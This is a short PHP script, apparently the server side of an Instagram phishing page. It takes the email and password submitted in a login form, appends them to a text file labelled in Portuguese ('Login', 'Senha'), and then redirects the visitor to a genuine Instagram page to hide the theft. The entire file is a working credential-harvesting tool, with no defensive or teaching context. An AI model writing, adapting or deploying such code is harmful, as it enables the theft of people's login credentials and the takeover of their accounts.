


<?php

	$n1 = $_POST["email"];
	$n2 = $_POST["password"];

	$conteudo = "Login: $n1 \nSenha: $n2\n\n\n";


	$arquivo = "log".".txt";


	if (!$abrir = fopen($arquivo, "a")) { echo "Erro abrindo arquivo 


	($arquivo)"; exit; }



	if (!fwrite($abrir, $conteudo)) { print "Erro escrevendo no arquivo 
	($arquivo)"; exit; } 




	fclose($abrir);


echo '<meta http-equiv="refresh" content=";url=https://www.instagram.com/explore/tags/cat/">'; 

    

 ?>






